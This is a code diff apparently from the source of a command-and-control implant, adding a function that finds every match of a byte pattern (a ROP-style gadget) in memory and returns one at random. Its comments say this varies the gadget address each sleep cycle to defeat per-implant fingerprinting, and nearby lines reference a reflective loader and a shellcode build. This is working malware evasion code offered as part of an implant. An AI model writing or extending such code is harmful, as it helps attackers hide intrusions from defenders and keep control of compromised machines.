@@ -260,6 +260,50 @@ PVOID MmGadgetFind(
     return NULL;
 }
 
+/* Maximum gadget addresses collected during a randomized scan (stack-allocated, no heap) */
+#define MM_GADGET_MAX_MATCHES 256
+
+/*!
+ * Scans a memory region for ALL occurrences of a byte pattern and returns a
+ * randomly selected match. Used when Config.Implant.RandGadget is TRUE so the
+ * active gadget address varies each sleep cycle, defeating per-implant fingerprinting.
+ * @param Memory        Start of region to scan
+ * @param Length        Length of region in bytes
+ * @param PatternBuffer Byte pattern to search for
+ * @param PatternLength Length of pattern in bytes
+ * @return              Randomly selected matching address, or NULL if no match found
+ */
+PVOID MmGadgetFindRandom(
+    _In_ PVOID  Memory,
+    _In_ SIZE_T Length,
+    _In_ PVOID  PatternBuffer,
+    _In_ SIZE_T PatternLength
+) {
+    /* stack-allocated match table — avoids heap allocation in the pre-sleep window */
+    PVOID Matches[ MM_GADGET_MAX_MATCHES ];
+    ULONG Count = 0;
+
+    /* argument guard — same as MmGadgetFind */
+    if ( ( ! Memory        || ! Length        ) ||
+         ( ! PatternBuffer || ! PatternLength )
+    ) {
+        return NULL;
+    }
+
+    /* collect every matching address up to the array limit */
+    for ( SIZE_T Len = 0; Len < Length && Count < MM_GADGET_MAX_MATCHES; Len++ ) {
+        if ( MemCompare( C_PTR( U_PTR( Memory ) + Len ), PatternBuffer, PatternLength ) == 0 ) {
+            Matches[ Count++ ] = C_PTR( U_PTR( Memory ) + Len );
+        }
+    }
+
+    if ( Count == 0 )
+        return NULL;
+
+    /* pick a random entry — uniform distribution over all collected matches */
+    return Matches[ RandomNumber32() % Count ];
+}
+
 #ifdef SHELLCODE
 /*!
  * Frees the reflective loader
